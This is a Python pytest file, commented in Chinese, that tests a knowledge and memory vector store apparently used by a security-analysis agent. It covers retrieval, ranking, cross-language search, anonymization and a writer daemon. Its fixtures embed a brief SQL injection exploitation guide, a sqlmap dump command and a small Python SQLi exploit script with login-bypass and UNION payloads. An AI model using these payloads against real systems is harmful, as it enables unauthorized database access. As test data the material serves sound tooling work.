"""Knowledge MCP 复杂场景端到端测试。

验证真实 agent 使用模式：
  - store → search 往返（存了能搜到）
  - 多条同类数据 + 排序
  - 中文 query 搜英文 content（实际使用模式）
  - 敏感数据全链路匿名化
  - memory daemon stdin → search_in_memory
"""
import json
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import pytest

KNOWLEDGE_DIR = Path(__file__).resolve().parents[2] / ".opencode" / "mcp-servers" / "knowledge"
sys.path.insert(0, str(KNOWLEDGE_DIR))

PYTHON = str(Path.home() / "bw-security-analysis" / ".venv" / "bin" / "python")
DAEMON_SCRIPT = str(KNOWLEDGE_DIR / "memory_writer_daemon.py")


@pytest.fixture(scope="module")
def embedder():
    from sentence_transformers import SentenceTransformer
    return SentenceTransformer("BAAI/bge-m3")


@pytest.fixture
def db(embedder):
    with tempfile.TemporaryDirectory() as tmp:
        from db import MemoryDB
        db = MemoryDB(Path(tmp) / "test.db", embedder)
        yield db
        db.close()


# ═════════════════════════════════════════════════════════
# 场景 1：store → search 往返
# ═════════════════════════════════════════════════════════


class TestStoreSearchRoundTrip:
    """存入后能搜到——最基本的端到端验证。"""

    def test_knowledge_round_trip(self, db):
        db.store(
            question="Ghidra installation",
            content="Download Ghidra from official site, extract zip, run ghidraRun.bat",
        )
        results = db.search(["how to install Ghidra"])
        assert len(results) > 0, "应搜到刚存的 knowledge"
        assert "Ghidra" in results[0]["answer"]

    def test_code_round_trip(self, db):
        db.store(
            question="Python RSA decryption",
            content="from Crypto.PublicKey import RSA\nkey = RSA.import_key(open('private.pem').read())",
            lang="python",
        )
        results = db.search(["RSA decrypt python"], lang="python")
        assert len(results) > 0, "应搜到刚存的 code"
        assert "RSA" in results[0]["answer"]

    def test_memory_round_trip(self, db):
        db.store(
            question="[bash] execution",
            content="Tool: bash\nArguments: nmap -sV 10.0.0.1\nResult: 22/tcp open ssh",
            doc_type="memory",
        )
        results = db.search(["nmap scan result"], doc_type="memory")
        assert len(results) > 0, "应搜到刚存的 memory"
        assert "nmap" in results[0]["answer"]


# ═════════════════════════════════════════════════════════
# 场景 2：多条同类数据 + 排序
# ═════════════════════════════════════════════════════════


class TestMultipleEntriesRanking:
    """存多条数据，验证搜索排序正确。"""

    def test_more_relevant_ranks_higher(self, db):
        db.store("intro", "Brief mention of SQL injection")
        db.store("details", "Detailed SQL injection exploitation with sqlmap, "
                 "union-based and blind techniques, bypassing WAF")

        results = db.search(["SQL injection exploitation sqlmap"])
        assert len(results) >= 2

        # 更详细的答案应排前面（与 query 更相关）
        top = results[0]
        assert "sqlmap" in top["answer"].lower() or "exploitation" in top["answer"].lower(), \
            f"最相关的应排第一，实际 top: {top['answer'][:80]}"

    def test_scores_in_descending_order(self, db):
        for i in range(5):
            db.store(f"q{i}", f"Buffer overflow vulnerability number {i} in function sub_40{i}00")

        results = db.search(["buffer overflow vulnerability"])
        scores = [r["score"] for r in results]
        assert scores == sorted(scores, reverse=True), f"分数应降序排列，实际: {scores}"


# ═════════════════════════════════════════════════════════
# 场景 3：中文 query 搜英文 content（实际使用模式）
# ═════════════════════════════════════════════════════════


class TestChineseQueryEnglishContent:
    """agent 用中文搜索，content 是英文——BGE-M3 多语言能力验证。"""

    def test_chinese_query_finds_english(self, db):
        db.store(
            question="SQL injection vulnerability",
            content="SQL injection allows attacker to execute arbitrary SQL commands "
                   "via unsanitized user input in the login form parameter",
        )
        # 中文 query
        results = db.search(["登录表单的SQL注入漏洞"])
        assert len(results) > 0, "中文 query 应搜到英文 content"

    def test_chinese_query_finds_english_code(self, db):
        db.store(
            question="hash calculation",
            content="import hashlib\nresult = hashlib.sha256(b'data').hexdigest()",
            lang="python",
        )
        results = db.search(["Python哈希计算sha256"], lang="python")
        assert len(results) > 0, "中文 query 应搜到英文 code"


# ═════════════════════════════════════════════════════════
# 场景 4：敏感数据全链路匿名化
# ═════════════════════════════════════════════════════════


class TestAnonymizationFullChain:
    """store 含敏感数据 → 搜索返回 → 验证搜索结果不含原始敏感数据。

    注意：db.py 的 store 方法不做匿名化——匿名化在 server.py 的 store_knowledge 工具里做。
    这里测试的是 anonymizer → db.store 的完整链路。
    """

    def test_ip_anonymized_in_search_results(self, db):
        from anonymizer import anonymize
        raw_content = "Connected to 192.168.1.50 via SSH and found open ports 22, 80, 443"
        safe_content = anonymize(raw_content)
        db.store("server connection", safe_content)

        results = db.search(["server connection ports"])
        assert len(results) > 0
        for r in results:
            assert "192.168.1.50" not in r["answer"], f"搜索结果不应含原始 IP"
            assert "<IP>" in r["answer"], "应含匿名化占位符"

    def test_credential_anonymized_in_search_results(self, db):
        from anonymizer import anonymize
        raw_content = "Login with password=secret123 to access the admin panel at 10.0.0.5"
        safe_content = anonymize(raw_content)
        db.store("database access", safe_content)

        results = db.search(["database login admin"])
        assert len(results) > 0
        for r in results:
            assert "secret123" not in r["answer"], "搜索结果不应含原始密码"
            assert "10.0.0.5" not in r["answer"], "搜索结果不应含原始 IP"


# ═════════════════════════════════════════════════════════
# 场景 5：复杂内容完整端到端
# ═════════════════════════════════════════════════════════


class TestComplexContent:
    """用真实安全分析场景的复杂内容测试。"""

    def test_complex_guide_pentest(self, db):
        guide_text = """
# SQL Injection Exploitation Guide

## Step 1: Identify Injection Point
Use ' or 1=1-- to test for boolean-based SQL injection in login forms.

## Step 2: Extract Database Structure
Use UNION SELECT to enumerate tables and columns:
```sql
' UNION SELECT table_name,null,null FROM information_schema.tables--
```

## Step 3: Dump Data
Use sqlmap for automated extraction:
```bash
sqlmap -u "http://target/login" --data "user=*&pass=1" --dump
```
"""
        db.store(
            question="SQL injection exploitation guide",
            content=guide_text,
        )
        results = db.search(["how to exploit SQL injection step by step"])
        assert len(results) > 0
        assert "UNION SELECT" in results[0]["answer"] or "sqlmap" in results[0]["answer"]

    def test_complex_code_exploit(self, db):
        code_text = """import requests
import sys

def exploit_sqli(url, payload):
    response = requests.post(url, data={"username": payload, "password": "x"})
    if "Welcome" in response.text:
        return True
    return False

if __name__ == "__main__":
    target = sys.argv[1]
    payloads = ["' OR 1=1--", "' UNION SELECT 1,2,3--"]
    for p in payloads:
        if exploit_sqli(target, p):
            print(f"[+] Payload works: {p}")
"""
        db.store(
            question="SQL injection exploit script",
            content=code_text,
            lang="python",
        )
        results = db.search(["python SQL injection exploit script"], lang="python")
        assert len(results) > 0
        assert "exploit_sqli" in results[0]["answer"] or "requests.post" in results[0]["answer"]


# ═════════════════════════════════════════════════════════
# 场景 6：memory daemon stdin → search_in_memory
# ═════════════════════════════════════════════════════════


class TestMemoryDaemonEndToEnd:
    """通过 daemon stdin 写入 → 用 MemoryDB 搜索验证。"""

    def test_daemon_write_then_search(self, embedder):
        """启动 daemon → 写入事件 → 用 MemoryDB 搜索验证。"""
        with tempfile.TemporaryDirectory() as tmp:
            db_path = Path(tmp) / "knowledge.db"

            # 预创建 DB（daemon 不创建，只写入）
            from db import MemoryDB
            db = MemoryDB(db_path, embedder)
            db.close()

            # 启动 daemon（用环境变量指向临时 DB）
            proc = subprocess.Popen(
                [PYTHON, DAEMON_SCRIPT],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env={**__import__("os").environ, "KNOWLEDGE_DB_PATH": str(db_path)},
            )

            # 等待 READY
            try:
                ready_line = proc.stdout.readline()
                if "READY" not in ready_line:
                    stderr = proc.stderr.read() if proc.stderr else ""
                    pytest.skip(f"daemon 未就绪: {ready_line} stderr={stderr[:200]}")
            except Exception:
                pytest.skip("daemon 启动失败")

            # 写入 memory 事件
            event = json.dumps({
                "question": "nmap scan execution",
                "answer": "Tool: bash\nArguments: nmap -sV 10.0.0.1\nResult: 22/tcp open ssh OpenSSH 8.0",
                "type": "bash",
            })
            proc.stdin.write(event + "\n")
            proc.stdin.flush()
            time.sleep(3)  # 等待 embed + store

            # 关闭 daemon
            proc.stdin.close()
            proc.wait(timeout=10)

            # 用 MemoryDB 搜索
            db2 = MemoryDB(db_path, embedder)
            results = db2.search(["nmap port scan ssh"], doc_type="memory")
            assert len(results) > 0, "daemon 写入的 memory 应可搜到"
            assert "nmap" in results[0]["answer"].lower()
            db2.close()
